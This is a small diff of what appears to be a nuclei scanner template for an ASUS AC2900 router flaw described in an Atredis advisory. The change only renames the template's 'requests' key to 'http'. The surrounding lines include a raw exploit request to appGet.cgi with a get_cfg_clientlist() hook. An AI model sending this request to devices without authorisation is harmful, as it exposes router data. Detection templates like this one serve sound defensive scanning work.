@@ -7,7 +7,7 @@ info:
   reference: https://github.com/atredispartners/advisories/blob/master/ATREDIS-2020-0010.md
   tags: AC2900,ASSUS
 
-requests:
+http:
   - raw:
       - |
         GET /appGet.cgi?hook=get_cfg_clientlist() HTTP/1.1
